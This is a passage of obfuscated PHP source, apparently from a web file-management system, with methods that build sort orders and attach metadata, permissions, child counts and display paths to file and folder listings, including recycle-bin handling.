$½Î»Áçè[443])) { $ì™¾«Ü¥ = str_replace($½Î»Áçè[443], $½Î»Áçè[444], $ì™¾«Ü¥); } else { $ì™¾«Ü¥ .= $½Î»Áçè[445] . $åÉµªÀ‹[1]; } $×‘•§Ğ½ = array(); foreach ($ñŠõÃè‡ as $ĞçØîÛ´ => $ÇƒŞ’Ò) { $×‘•§Ğ½[$½Î»Áçè[438] . $ĞçØîÛ´] = $ÇƒŞ’Ò; } $this->alias($½Î»Áçè[446])->field($†ñáàˆ£)->limit($é¸ãÊšö)->order($ì™¾«Ü¥); $™º“Ãîß = $this->join($ê¦­±Õ)->where($×‘•§Ğ½)->select(); if ($™º“Ãîß) { $×¬—“î€[$½Î»Áçè[369]] = $™º“Ãîß; } } protected function _makeOrder($Á©‰Âå« = false) { $£”ü¹ã =& $_SERVER[ÏéâËõ‘]; $ı°ß‰İß = Model($£”ü¹ã[447])->get($£”ü¹ã[448]); $¢Òºö¶” = Model($£”ü¹ã[447])->get($£”ü¹ã[449]); $âŞ§÷ìÑ = array($£”ü¹ã[450] => $£”ü¹ã[451], $£”ü¹ã[452] => $£”ü¹ã[453]); $Ï³ôÓƒ² = array($£”ü¹ã[32] => $£”ü¹ã[32], $£”ü¹ã[76] => $£”ü¹ã[76], $£”ü¹ã[174] => $£”ü¹ã[412], $£”ü¹ã[454] => $£”ü¹ã[454], $£”ü¹ã[455] => $£”ü¹ã[456], $£”ü¹ã[200] => $£”ü¹ã[200], $£”ü¹ã[85] => $£”ü¹ã[85]); $âÖ§ÑïÔ = Input::get($£”ü¹ã[457], $£”ü¹ã[7], $ı°ß‰İß, array_keys($Ï³ôÓƒ²)); $¤â’õÃ¼ = Input::get($£”ü¹ã[458], $£”ü¹ã[7], $¢Òºö¶”, array_keys($âŞ§÷ìÑ)); if (!in_array($âÖ§ÑïÔ, array_keys($Ï³ôÓƒ²))) { $âÖ§ÑïÔ = $£”ü¹ã[32]; } if (!in_array($¤â’õÃ¼, array_keys($âŞ§÷ìÑ))) { $âÖ§ÑïÔ = $£”ü¹ã[450]; } if ($âÖ§ÑïÔ == $£”ü¹ã[32]) { } $†ï¯¢Û = $£”ü¹ã[459] . $Ï³ôÓƒ²[$âÖ§ÑïÔ] . $£”ü¹ã[53] . $âŞ§÷ìÑ[$¤â’õÃ¼]; $†ï¯¢Û = rtrim(trim($†ï¯¢Û), $£”ü¹ã[50]); if ($Á©‰Âå«) { return array($†ï¯¢Û, $âŞ§÷ìÑ[$¤â’õÃ¼]); } return $this->order($†ï¯¢Û); } protected function _listDataApplyItem($‹»İúı, $Ğ†Ïæßº = false) { $ÌÛ¶¾À† = array($‹»İúı); $this->_listDataApply($ÌÛ¶¾À†, $Ğ†Ïæßº); return $ÌÛ¶¾À†[0]; } protected function _listDataApply(&$ñ“ÓŒÜ, $ÃÊ»’ã = false) { $µó½ì¼ä =& $_SERVER[ÏéâËõ‘]; if (!$ñ“ÓŒÜ) { $ñ“ÓŒÜ = array(); return; } $ºˆ×ÜŠ = array_to_keyvalue($ñ“ÓŒÜ, $µó½ì¼ä[12], $µó½ì¼ä[402]); $ºˆ×ÜŠ = array_unique($ºˆ×ÜŠ); $this->_listSourceCache($ñ“ÓŒÜ); if (!$ÃÊ»’ã) { $this->_listAppendMeta($ñ“ÓŒÜ, $ºˆ×ÜŠ); $this->_listAppendFileMeta($ñ“ÓŒÜ, $ºˆ×ÜŠ); $this->_listAppendChildren($ñ“ÓŒÜ, $ºˆ×ÜŠ); } $this->_listAppendPath($ñ“ÓŒÜ); $this->_listAppendAuth($ñ“ÓŒÜ); $this->_listAppendSourceInfo($ñ“ÓŒÜ, $ºˆ×ÜŠ); $this->_listAppendUser($ñ“ÓŒÜ); $this->_listFilterInfo($ñ“ÓŒÜ, $ÃÊ»’ã); $this->_listAppendAuthSecret($ñ“ÓŒÜ); } protected function _listSourceCache($ñµÁ€Â) { $ìÕ”¤Ì¤ =& $_SERVER[ÏéâËõ‘]; foreach ($ñµÁ€Â as $›ì£ˆÓ‡) { self::$cacheSourceInfo[$ìÕ”¤Ì¤[460] . $›ì£ˆÓ‡[$ìÕ”¤Ì¤[402]]] = $›ì£ˆÓ‡; } } protected function _listFilterInfo(&$ŠÜØ«Ú‰, $æùÇÏÚã = false) { $Ò×—¨Ö³ =& $_SERVER[ÏéâËõ‘]; foreach ($ŠÜØ«Ú‰ as &$Îµ«è) { $Îµ«è = $this->pathInfoFilter($Îµ«è); self::$cachePathInfo[$Ò×—¨Ö³[461] . intval($æùÇÏÚã) . $Ò×—¨Ö³[386] . $Îµ«è[$Ò×—¨Ö³[402]]] = $Îµ«è; } unset($Îµ«è); } protected function _listMake(&$™•óÖ­¦) { $Ú¯Ñ™šò =& $_SERVER[ÏéâËõ‘]; $™•óÖ­¦[$Ú¯Ñ™šò[82]] = array(); $™•óÖ­¦[$Ú¯Ñ™šò[83]] = array(); foreach ($™•óÖ­¦[$Ú¯Ñ™šò[369]] as $úˆÀ‚¸) { $¸èêÖà = $úˆÀ‚¸[$Ú¯Ñ™šò[410]] == 1 ? $Ú¯Ñ™šò[82] : $Ú¯Ñ™šò[83]; $™•óÖ­¦[$¸èêÖà][] = $úˆÀ‚¸; } unset($™•óÖ­¦[$Ú¯Ñ™šò[369]]); } protected function _listAppendMeta(&$Ğ’É® á, $“Æ‰—¾Ç) { $²Í»æãõ =& $_SERVER[ÏéâËõ‘]; $ÊÁ¥¿ÛÔ = array($²Í»æãõ[417] => array($²Í»æãõ[418], $“Æ‰—¾Ç)); $ô¸šÜÃß = Model($²Í»æãõ[462])->field($²Í»æãõ[463])->where($ÊÁ¥¿ÛÔ)->select(); if (!$ô¸šÜÃß) { return; } $à·º²Ñê = array($²Í»æãõ[464], $²Í»æãõ[465], $²Í»æãõ[444]); $ÁÄ¨Ö²è = array(); foreach ($ô¸šÜÃß as $Ê³ÆÁ) { if (!isset($ÁÄ¨Ö²è[$Ê³ÆÁ[$²Í»æãõ[402]]])) { $ÁÄ¨Ö²è[$Ê³ÆÁ[$²Í»æãõ[402]]] = array(); } if (in_array($Ê³ÆÁ[$²Í»æãõ[94]], $à·º²Ñê)) { continue; } $ÁÄ¨Ö²è[$Ê³ÆÁ[$²Í»æãõ[402]]][$Ê³ÆÁ[$²Í»æãõ[94]]] = $Ê³ÆÁ[$²Í»æãõ[374]]; } foreach ($Ğ’É® á as &$€ê½Ğ¦) { $€ê½Ğ¦[$²Í»æãõ[466]] = !1; if (isset($ÁÄ¨Ö²è[$€ê½Ğ¦[$²Í»æãõ[402]]])) { $€ê½Ğ¦[$²Í»æãõ[466]] = $ÁÄ¨Ö²è[$€ê½Ğ¦[$²Í»æãõ[402]]]; } if ($this->fileIsLock($€ê½Ğ¦) && $€ê½Ğ¦[$²Í»æãõ[413]]) { $¶¦»Ñ­ä = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $€ê½Ğ¦[$²Í»æãõ[413]][$²Í»æãõ[414]] = AuthModel::authDisable($€ê½Ğ¦[$²Í»æãõ[413]][$²Í»æãõ[414]], $¶¦»Ñ­ä); $€ê½Ğ¦[$²Í»æãõ[413]][$²Í»æãõ[467]][$²Í»æãõ[413]] = $€ê½Ğ¦[$²Í»æãõ[413]][$²Í»æãõ[414]]; } } unset($€ê½Ğ¦); } protected function _listAppendFileMeta(&$óÇ”€Ã€, $ç˜‚İ™ı) { $Œ…¥§ã =& $_SERVER[ÏéâËõ‘]; $è×æ˜à = array_to_keyvalue($óÇ”€Ã€, $Œ…¥§ã[12], $Œ…¥§ã[468]); $è×æ˜à = array_filter(array_unique($è×æ˜à)); if (!$è×æ˜à) { return; } $ÃÖĞÖº = array($Œ…¥§ã[469] => array($Œ…¥§ã[418], $è×æ˜à)); $ÆÛ°±” = $Œ…¥§ã[470]; $ç‹§Íí¼ = Model($Œ…¥§ã[471])->field($ÆÛ°±”)->where($ÃÖĞÖº)->select(); $ç‹§Íí¼ = array_to_keyvalue($ç‹§Íí¼, $Œ…¥§ã[468]); $Ü‡Ÿõñî = Model($Œ…¥§ã[472])->field($Œ…¥§ã[473])->where($ÃÖĞÖº)->select(); $Ü‡Ÿõñî = $Ü‡Ÿõñî ? $Ü‡Ÿõñî : array(); $Šı¿Õ = array(); foreach ($Ü‡Ÿõñî as $¯èïÃÈ) { if (!isset($Šı¿Õ[$¯èïÃÈ[$Œ…¥§ã[468]]])) { $Šı¿Õ[$¯èïÃÈ[$Œ…¥§ã[468]]] = array(); } $Šı¿Õ[$¯èïÃÈ[$Œ…¥§ã[468]]][$¯èïÃÈ[$Œ…¥§ã[94]]] = $¯èïÃÈ[$Œ…¥§ã[374]]; } foreach ($óÇ”€Ã€ as &$ºÕ†ª–¹) { $ˆÃÂª²Ç = $ºÕ†ª–¹[$Œ…¥§ã[468]]; if (!$ˆÃÂª²Ç || !is_array($ç‹§Íí¼[$ˆÃÂª²Ç])) { continue; } $±Â³Å¨û = $ç‹§Íí¼[$ˆÃÂª²Ç]; $±Â³Å¨û[$Œ…¥§ã[76]] = $ºÕ†ª–¹[$Œ…¥§ã[76]]; $±Â³Å¨û[$Œ…¥§ã[32]] = $ºÕ†ª–¹[$Œ…¥§ã[32]]; if (!isset(self::$cacheFileInfo[$Œ…¥§ã[474] . $ˆÃÂª²Ç])) { self::$cacheFileInfo[$Œ…¥§ã[474] . $ˆÃÂª²Ç] = array_merge(array(), $±Â³Å¨û); } unset($ç‹§Íí¼[$ˆÃÂª²Ç][$Œ…¥§ã[84]]); $¿Æ‹½ì‰ = is_array($Šı¿Õ[$ˆÃÂª²Ç]) ? $Šı¿Õ[$ˆÃÂª²Ç] : array(); $ºÕ†ª–¹[$Œ…¥§ã[170]] = array_merge($¿Æ‹½ì‰, $ç‹§Íí¼[$ˆÃÂª²Ç]); if (isset($ºÕ†ª–¹[$Œ…¥§ã[170]][$Œ…¥§ã[169]])) { $ºÕ†ª–¹[$Œ…¥§ã[169]] = json_decode($ºÕ†ª–¹[$Œ…¥§ã[170]][$Œ…¥§ã[169]], !0); unset($ºÕ†ª–¹[$Œ…¥§ã[170]][$Œ…¥§ã[169]]); } } unset($ºÕ†ª–¹); } protected function _listAppendSourceInfo(&$áˆÃŒ­, $çƒ Ëë‹) { $ƒöøù‡ø =& $_SERVER[ÏéâËõ‘]; if (!defined($ƒöøù‡ø[475])) { return; } $ñ´´åÒè = Model($ƒöøù‡ø[476])->listData(); $Ø¦şˆ½‡ = Model($ƒöøù‡ø[425])->listData(); $ÙÓøÊ½¢ = Model($ƒöøù‡ø[415])->listData(); $Ğ§çî€ = Model($ƒöøù‡ø[477])->listSimple(); $ŸÂµ´ÈÆ = array_to_keyvalue($ñ´´åÒè, $ƒöøù‡ø[399]); $ü ¯©Šó = array_to_keyvalue_group($Ø¦şˆ½‡, $ƒöøù‡ø[84], $ƒöøù‡ø[426]); $ï”úê€ = array_to_keyvalue($ÙÓøÊ½¢, $ƒöøù‡ø[84]); $×˜¶Àİ¤ = array_to_keyvalue_group($Ğ§çî€, $ƒöøù‡ø[402]); foreach ($áˆÃŒ­ as &$‹Ò¼“±æ) { $‹Ò¼“±æ[$ƒöøù‡ø[86]] = array($ƒöøù‡ø[478] => 0, $ƒöøù‡ø[479] => 0, $ƒöøù‡ø[480] => 0); if (isset($ï”úê€[$‹Ò¼“±æ[$ƒöøù‡ø[402]]])) { $‹Ò¼“±æ[$ƒöøù‡ø[86]][$ƒöøù‡ø[481]] = 1; $‹Ò¼“±æ[$ƒöøù‡ø[86]][$ƒöøù‡ø[482]] = $ï”úê€[$‹Ò¼“±æ[$ƒöøù‡ø[402]]][$ƒöøù‡ø[32]]; } if ($ü ¯©Šó && $ŸÂµ´ÈÆ && isset($ü ¯©Šó[$‹Ò¼“±æ[$ƒöøù‡ø[402]]])) { $‹Ò¼“±æ[$ƒöøù‡ø[86]][$ƒöøù‡ø[483]] = array(); foreach ($ü ¯©Šó[$‹Ò¼“±æ[$ƒöøù‡ø[402]]] as $—ŸÖŒµ) { $ª‡·ÌÜ = $ŸÂµ´ÈÆ[$—ŸÖŒµ]; $‹Ò¼“±æ[$ƒöøù‡ø[86]][$ƒöøù‡ø[483]][] = array($ƒöøù‡ø[484] => $ª‡·ÌÜ[$ƒöøù‡ø[399]], $ƒöøù‡ø[420] => $ª‡·ÌÜ[$ƒöøù‡ø[32]], $ƒöøù‡ø[485] => $ª‡·ÌÜ[$ƒöøù‡ø[486]]); } } if ($×˜¶Àİ¤ && isset($×˜¶Àİ¤[$‹Ò¼“±æ[$ƒöøù‡ø[402]]])) { $‹Ò¼“±æ[$ƒöøù‡ø[86]][$ƒöøù‡ø[487]] = array(); foreach ($×˜¶Àİ¤[$‹Ò¼“±æ[$ƒöøù‡ø[402]]] as $¼Î§±”ó) { $‹Ò¼“±æ[$ƒöøù‡ø[86]][$ƒöøù‡ø[487]] = array($ƒöøù‡ø[488] => $¼Î§±”ó[$ƒöøù‡ø[489]], $ƒöøù‡ø[490] => $¼Î§±”ó[$ƒöøù‡ø[491]], $ƒöøù‡ø[492] => $¼Î§±”ó[$ƒöøù‡ø[402]], $ƒöøù‡ø[493] => $¼Î§±”ó[$ƒöøù‡ø[494]], $ƒöøù‡ø[495] => $¼Î§±”ó[$ƒöøù‡ø[496]], $ƒöøù‡ø[497] => $¼Î§±”ó[$ƒöøù‡ø[497]], $ƒöøù‡ø[498] => $¼Î§±”ó[$ƒöøù‡ø[498]]); } } } unset($‹Ò¼“±æ); return $áˆÃŒ­; } protected function _listAppendChildren(&$İœ¼é±š, $§î£Óæ¤) { $‚ëÔ·’Õ =& $_SERVER[ÏéâËõ‘]; $Ï¯¶Ç€› = array(); $§‡é¶ò– = array($‚ëÔ·’Õ[207] => 0, $‚ëÔ·’Õ[208] => 0); foreach ($İœ¼é±š as &$åÓù¥ûÌ) { if (!$åÓù¥ûÌ[$‚ëÔ·’Õ[410]]) { continue; } $Ï¯¶Ç€›[] = $åÓù¥ûÌ[$‚ëÔ·’Õ[402]]; } unset($åÓù¥ûÌ); if (!$Ï¯¶Ç€›) { return; } $†îñ—…ƒ = array($‚ëÔ·’Õ[432] => array($‚ëÔ·’Õ[7], $Ï¯¶Ç€›), $‚ëÔ·’Õ[431] => 0); $Î†úÄğı = array($‚ëÔ·’Õ[432], $‚ëÔ·’Õ[410], $‚ëÔ·’Õ[499] => $‚ëÔ·’Õ[500]); $ÍÌÒ£¯« = $this->field($Î†úÄğı)->where($†îñ—…ƒ)->group($‚ëÔ·’Õ[501])->select(); $™­Û«®¶ = array(); foreach ($ÍÌÒ£¯« as $™¶­Œ½Ê) { $ªÉˆò”Ê = $™¶­Œ½Ê[$‚ëÔ·’Õ[432]]; $ø“±…æû = $™¶­Œ½Ê[$‚ëÔ·’Õ[410]] == $‚ëÔ·’Õ[88] ? $‚ëÔ·’Õ[208] : $‚ëÔ·’Õ[207]; if (!isset($™­Û«®¶[$ªÉˆò”Ê])) { $™­Û«®¶[$ªÉˆò”Ê] = array($‚ëÔ·’Õ[207] => 0, $‚ëÔ·’Õ[208] => 0); } $™­Û«®¶[$ªÉˆò”Ê][$ø“±…æû] += $™¶­Œ½Ê[$‚ëÔ·’Õ[500]]; } foreach ($İœ¼é±š as &$åÓù¥ûÌ) { if (!$åÓù¥ûÌ[$‚ëÔ·’Õ[410]]) { continue; } $€˜ô£è = is_array($™­Û«®¶[$åÓù¥ûÌ[$‚ëÔ·’Õ[402]]]) ? $™­Û«®¶[$åÓù¥ûÌ[$‚ëÔ·’Õ[402]]] : $§‡é¶ò–; $åÓù¥ûÌ[$‚ëÔ·’Õ[208]] = $€˜ô£è[$‚ëÔ·’Õ[208]]; $åÓù¥ûÌ[$‚ëÔ·’Õ[207]] = $€˜ô£è[$‚ëÔ·’Õ[207]]; unset($åÓù¥ûÌ[$‚ëÔ·’Õ[412]]); } unset($åÓù¥ûÌ); } protected function _listAppendAuth(&$ìÑßÊÌç) { $¢¦Æ†Ö¯ =& $_SERVER[ÏéâËõ‘]; if (!defined($¢¦Æ†Ö¯[475])) { return; } $Ú‘Å›Ù€ = array(); foreach ($ìÑßÊÌç as $İ¡¼æ‡) { if ($İ¡¼æ‡[$¢¦Æ†Ö¯[411]] == self::TYPE_GROUP) { $Ú‘Å›Ù€[] = $İ¡¼æ‡[$¢¦Æ†Ö¯[402]]; } } if (!$Ú‘Å›Ù€) { return; } $×õß¸Èü = array_to_keyvalue($ìÑßÊÌç, $¢¦Æ†Ö¯[402]); $Šä‡®ƒï = Model($¢¦Æ†Ö¯[502])->getSourceList($Ú‘Å›Ù€, $×õß¸Èü); $¹ÆÔ†âø = $GLOBALS[$¢¦Æ†Ö¯[503]] == 1; foreach ($ìÑßÊÌç as $Ã®“×€Ê => &$İ¡¼æ‡) { $İ¡¼æ‡[$¢¦Æ†Ö¯[413]] = $Šä‡®ƒï[$İ¡¼æ‡[$¢¦Æ†Ö¯[402]]]; if (!$İ¡¼æ‡[$¢¦Æ†Ö¯[413]] && $İ¡¼æ‡[$¢¦Æ†Ö¯[411]] == self::TYPE_GROUP) { $İ¡¼æ‡[$¢¦Æ†Ö¯[413]] = Action($¢¦Æ†Ö¯[504])->pathGroupAuthMake($İ¡¼æ‡[$¢¦Æ†Ö¯[505]]); if (!$İ¡¼æ‡[$¢¦Æ†Ö¯[413]] && !$¹ÆÔ†âø) { $İ¡¼æ‡[$¢¦Æ†Ö¯[202]] = !1; $İ¡¼æ‡[$¢¦Æ†Ö¯[201]] = !1; } } if ($İ¡¼æ‡[$¢¦Æ†Ö¯[413]]) { $İ¡¼æ‡[$¢¦Æ†Ö¯[202]] = AuthModel::authCheckEdit($İ¡¼æ‡[$¢¦Æ†Ö¯[413]][$¢¦Æ†Ö¯[414]]); $İ¡¼æ‡[$¢¦Æ†Ö¯[201]] = AuthModel::authCheckView($İ¡¼æ‡[$¢¦Æ†Ö¯[413]][$¢¦Æ†Ö¯[414]]); } $this->groupPathDisplay($İ¡¼æ‡); } unset($İ¡¼æ‡); } public function _listAppendAuthSecret(&$âÚÚı·) { $½ıÃØˆ =& $_SERVER[ÏéâËõ‘]; if (Model($½ıÃØˆ[435])->get($½ıÃØˆ[506]) != $½ıÃØˆ[88]) { return; } static $àô±ôû¡ = false; if (!$àô±ôû¡) { $ºÄƒŒ³“ = Model($½ıÃØˆ[507]); $ºğì²òª = Model($½ıÃØˆ[508]); $àô±ôû¡ = $ºğì²òª->listData(); $àô±ôû¡ = array_to_keyvalue($àô±ôû¡, $½ıÃØˆ[402]); $…Î·å¥ó = json_decode(Model($½ıÃØˆ[435])->get($½ıÃØˆ[509]), !0); $…Î·å¥ó = array_to_keyvalue($…Î·å¥ó, $½ıÃØˆ[399]); foreach ($àô±ôû¡ as $Æ¥¹ÍßÖ => $ê²“Ã•Î) { $©­ß¶ñ = $…Î·å¥ó[$ê²“Ã•Î[$½ıÃØˆ[510]]]; if (!$©­ß¶ñ) { $ºğì²òª->remove($ê²“Ã•Î[$½ıÃØˆ[399]]); unset($àô±ôû¡[$Æ¥¹ÍßÖ]); continue; } $†İàµ€Ş = $ºÄƒŒ³“->listData($©­ß¶ñ[$½ıÃØˆ[413]]); if (!$†İàµ€Ş) { $ºğì²òª->remove($ê²“Ã•Î[$½ıÃØˆ[399]]); unset($àô±ôû¡[$Æ¥¹ÍßÖ]); continue; } $ê²“Ã•Î[$½ıÃØˆ[413]] = $†İàµ€Ş; $ê²“Ã•Î[$½ıÃØˆ[511]] = $©­ß¶ñ; $ê²“Ã•Î[$½ıÃØˆ[512]] = Model($½ıÃØˆ[513])->getInfoSimpleOuter($ê²“Ã•Î[$½ıÃØˆ[454]]); $àô±ôû¡[$Æ¥¹ÍßÖ] = $ê²“Ã•Î; } } $¿»î¬Ã‹ = defined($½ıÃØˆ[514]) ? USER_ID : $½ıÃØˆ[12]; $“È°Ô† = array(); $³¼•¤•Ç = $this->_listAppendPath($“È°Ô†, !0); foreach ($âÚÚı· as $Æ¥¹ÍßÖ => &$ê²“Ã•Î) { if (!is_array($ê²“Ã•Î[$½ıÃØˆ[413]])) { continue; } if ($ê²“Ã•Î[$½ıÃØˆ[411]] != $½ıÃØˆ[515]) { continue; } if (isset($àô±ôû¡[$ê²“Ã•Î[$½ıÃØˆ[402]]])) { $È³úÙµ¾ = $àô±ôû¡[$ê²“Ã•Î[$½ıÃØˆ[402]]]; if (!is_array($ê²“Ã•Î[$½ıÃØˆ[466]])) { $ê²“Ã•Î[$½ıÃØˆ[466]] = array(); } $ê²“Ã•Î[$½ıÃØˆ[466]][$½ıÃØˆ[516]] = $È³úÙµ¾[$½ıÃØˆ[510]]; $ê²“Ã•Î[$½ıÃØˆ[413]][$½ıÃØˆ[517]] = $È³úÙµ¾; $ê²“Ã•Î[$½ıÃØˆ[413]][$½ıÃØˆ[518]] = $ê²“Ã•Î[$½ıÃØˆ[519]]; $ê²“Ã•Î[$½ıÃØˆ[413]][$½ıÃØˆ[520]] = $½ıÃØˆ[88]; if ($È³úÙµ¾[$½ıÃØˆ[454]] != $¿»î¬Ã‹) { $ê²“Ã•Î[$½ıÃØˆ[413]][$½ıÃØˆ[414]] = $ê²“Ã•Î[$½ıÃØˆ[413]][$½ıÃØˆ[414]] & $È³úÙµ¾[$½ıÃØˆ[413]][$½ıÃØˆ[413]]; } continue; } $ë©ÂÊı“ = $this->parentLevelArray($ê²“Ã•Î[$½ıÃØˆ[521]]); $¥Û‚£¿© = array_reverse($ë©ÂÊı“); foreach ($¥Û‚£¿© as $«Ò˜¶©ª => $´İå “Õ) { if (!isset($àô±ôû¡[$´İå “Õ])) { continue; } $È³úÙµ¾ = $àô±ôû¡[$´İå “Õ]; $ê²“Ã•Î[$½ıÃØˆ[413]][$½ıÃØˆ[517]] = $È³úÙµ¾; if ($È³úÙµ¾[$½ıÃØˆ[454]] != $¿»î¬Ã‹) { $ê²“Ã•Î[$½ıÃØˆ[413]][$½ıÃØˆ[414]] = $ê²“Ã•Î[$½ıÃØˆ[413]][$½ıÃØˆ[414]] & $È³úÙµ¾[$½ıÃØˆ[413]][$½ıÃØˆ[413]]; } $ìß‹Ş’á = $½ıÃØˆ[12]; $˜¯ì…¾Á = count($ë©ÂÊı“) - $«Ò˜¶©ª; for ($¾¤ÌÛö = 0; $¾¤ÌÛö < $˜¯ì…¾Á; $¾¤ÌÛö++) { if (!isset($³¼•¤•Ç[$ë©ÂÊı“[$¾¤ÌÛö]])) { $ìß‹Ş’á = $½ıÃØˆ[12]; break; } $ìß‹Ş’á = $ìß‹Ş’á . rtrim($³¼•¤•Ç[$ë©ÂÊı“[$¾¤ÌÛö]], $½ıÃØˆ[8]) . $½ıÃØˆ[8]; } $ê²“Ã•Î[$½ıÃØˆ[413]][$½ıÃØˆ[518]] = rtrim($ìß‹Ş’á, $½ıÃØˆ[8]) . $½ıÃØˆ[8]; break; } } unset($ê²“Ã•Î); } public function groupPathDisplay(&$ÔÃ®‡Šš) { $Í©ÍÁŒä =& $_SERVER[ÏéâËõ‘]; if ($ÔÃ®‡Šš[$Í©ÍÁŒä[411]] != self::TYPE_GROUP) { return; } $àÒäÂŠĞ = Model($Í©ÍÁŒä[522])->getInfo($ÔÃ®‡Šš[$Í©ÍÁŒä[505]]); $©˜é”«ç = $this->parentLevelArray($àÒäÂŠĞ[$Í©ÍÁŒä[521]]); $˜şÌØ„Ì = $Í©ÍÁŒä[12]; foreach ($©˜é”«ç as $Ÿ“ÁÍÊœ) { $ÈıöíŠ½ = Model($Í©ÍÁŒä[522])->getInfo($Ÿ“ÁÍÊœ); $˜şÌØ„Ì .= $ÈıöíŠ½[$Í©ÍÁŒä[86]][$Í©ÍÁŒä[402]] . $Í©ÍÁŒä[50]; } $ÔÃ®‡Šš[$Í©ÍÁŒä[523]] = $àÒäÂŠĞ[$Í©ÍÁŒä[432]]; $ÔÃ®‡Šš[$Í©ÍÁŒä[524]] = $àÒäÂŠĞ[$Í©ÍÁŒä[521]]; $ÔÃ®‡Šš[$Í©ÍÁŒä[525]] = $àÒäÂŠĞ[$Í©ÍÁŒä[526]]; $ÔÃ®‡Šš[$Í©ÍÁŒä[527]] = $˜şÌØ„Ì . $àÒäÂŠĞ[$Í©ÍÁŒä[86]][$Í©ÍÁŒä[402]]; } protected function _listAppendPath(&$Ã°×öŠâ, $¬…¼¼ü… = false) { $½‹…ŠâÖ =& $_SERVER[ÏéâËõ‘]; static $àŠÈúªø = array(); $¢ß·®ó‚ = array(); $îÒÙ„Õ = array(); if ($¬…¼¼ü…) { return $àŠÈúªø; } foreach ($Ã°×öŠâ as &$„°Ÿæôí) { $˜ãããÎ€ = $„°Ÿæôí[$½‹…ŠâÖ[402]]; if ($„°Ÿæôí[$½‹…ŠâÖ[410]] == $½‹…ŠâÖ[88] && $„°Ÿæôí[$½‹…ŠâÖ[432]] != 0) { $àŠÈúªø[$˜ãããÎ€] = $„°Ÿæôí[$½‹…ŠâÖ[32]]; } if ($„°Ÿæôí[$½‹…ŠâÖ[410]] == $½‹…ŠâÖ[88] && $„°Ÿæôí[$½‹…ŠâÖ[432]] == 0 && !isset($àŠÈúªø[$˜ãããÎ€])) { $àŠÈúªø[$˜ãããÎ€] = $this->_listAppendPathRoot($„°Ÿæôí, array()); } if (isset($îÒÙ„Õ[$„°Ÿæôí[$½‹…ŠâÖ[521]]])) { continue; } $îÒÙ„Õ[$„°Ÿæôí[$½‹…ŠâÖ[521]]] = !0; $Ÿ« ‹­è = $this->parentLevelArray($„°Ÿæôí[$½‹…ŠâÖ[521]]); foreach ($Ÿ« ‹­è as $½¶†ëõü => $²¶ÓŒ€) { if (isset($àŠÈúªø[$²¶ÓŒ€])) { continue; } if ($½¶†ëõü == 0) { $àŠÈúªø[$²¶ÓŒ€] = $this->_listAppendPathRoot($„°Ÿæôí, $Ÿ« ‹­è); } if ($½¶†ëõü != 0) { $¢ß·®ó‚[] = $²¶ÓŒ€; } } } unset($„°Ÿæôí); $¢ß·®ó‚ = array_unique($¢ß·®ó‚); if (count($¢ß·®ó‚) > 0) { $±‹¶¼“Ö = array($½‹…ŠâÖ[417] => array($½‹…ŠâÖ[418], $¢ß·®ó‚)); if (count($¢ß·®ó‚) == 1) { $ï¯–ÍéØ = $this->sourceInfo($¢ß·®ó‚[0]); $»—ÎÅ»ä = is_array($ï¯–ÍéØ) ? array($ï¯–ÍéØ) : !1; } else { $»—ÎÅ»ä = $this->field($½‹…ŠâÖ[528])->where($±‹¶¼“Ö)->select(); } if (!$»—ÎÅ»ä) { $»—ÎÅ»ä = array(); } foreach ($»—ÎÅ»ä as $™ìºİá) { $àŠÈúªø[$™ìºİá[$½‹…ŠâÖ[402]]] = $™ìºİá[$½‹…ŠâÖ[32]]; } } $ŸôÇÓŞ÷ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $äôìäÅ = array(); foreach ($Ã°×öŠâ as &$„°Ÿæôí) { $“±ÌšÜÅ = $„°Ÿæôí[$½‹…ŠâÖ[521]]; $ûÃ¾Õ™ = $½‹…ŠâÖ[12]; if (isset($äôìäÅ[$“±ÌšÜÅ])) { $ûÃ¾Õ™ = $äôìäÅ[$“±ÌšÜÅ]; } else { $Ÿ« ‹­è = $this->parentLevelArray($„°Ÿæôí[$½‹…ŠâÖ[521]]); foreach ($Ÿ« ‹­è as $½¶†ëõü => $²¶ÓŒ€) { if (isset($àŠÈúªø[$²¶ÓŒ€])) { $ûÃ¾Õ™ .= $àŠÈúªø[$²¶ÓŒ€] . $½‹…ŠâÖ[8]; } } $äôìäÅ[$“±ÌšÜÅ] = $ûÃ¾Õ™; } $ûÃ¾Õ™ .= $„°Ÿæôí[$½‹…ŠâÖ[32]]; if ($„°Ÿæôí[$½‹…ŠâÖ[410]] == $½‹…ŠâÖ[88]) { $ûÃ¾Õ™ .= $½‹…ŠâÖ[8]; } $„°Ÿæôí[$½‹…ŠâÖ[519]] = str_replace($½‹…ŠâÖ[529], $½‹…ŠâÖ[8], $ûÃ¾Õ™); if ($„°Ÿæôí[$½‹…ŠâÖ[432]] == $½‹…ŠâÖ[197]) { $„°Ÿæôí[$½‹…ŠâÖ[32]] = trim($àŠÈúªø[$„°Ÿæôí[$½‹…ŠâÖ[402]]], $½‹…ŠâÖ[8]); $„°Ÿæôí[$½‹…ŠâÖ[519]] = $„°Ÿæôí[$½‹…ŠâÖ[32]] . $½‹…ŠâÖ[8]; } if (intval($„°Ÿæôí[$½‹…ŠâÖ[411]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($„°Ÿæôí, $Ÿ« ‹­è, $ŸôÇÓŞ÷); } } unset($„°Ÿæôí); return $Ã°×öŠâ; } private function _listAppendPathRecycle(&$©©È„´Ù, $¹­ôçæî, $Ù±‹È½ñ) { $²ÌéÌ• =& $_SERVER[ÏéâËõ‘]; if (!in_array($Ù±‹È½ñ, $¹­ôçæî) && $©©È„´Ù[$²ÌéÌ•[402]] != $Ù±‹È½ñ) { return; } $¨°÷¥š» = explode($²ÌéÌ•[8], trim($©©È„´Ù[$²ÌéÌ•[519]], $²ÌéÌ•[8])); $õğµé™ë = implode($²ÌéÌ•[8], array_slice($¨°÷¥š», 2)); $©©È„´Ù[$²ÌéÌ•[519]] = $²ÌéÌ•[8] . LNG($²ÌéÌ•[530]) . $²ÌéÌ•[8] . ltrim($õğµé™ë, $²ÌéÌ•[8]); $©©È„´Ù[$²ÌéÌ•[521]] = $²ÌéÌ•[531] . implode($²ÌéÌ•[50], array_slice($¹­ôçæî, 1)) . $²ÌéÌ•[50]; if ($©©È„´Ù[$²ÌéÌ•[402]] == $Ù±‹È½ñ) { $©©È„´Ù[$²ÌéÌ•[521]] = $²ÌéÌ•[531]; $©©È„´Ù[$²ÌéÌ•[432]] = $²ÌéÌ•[197]; 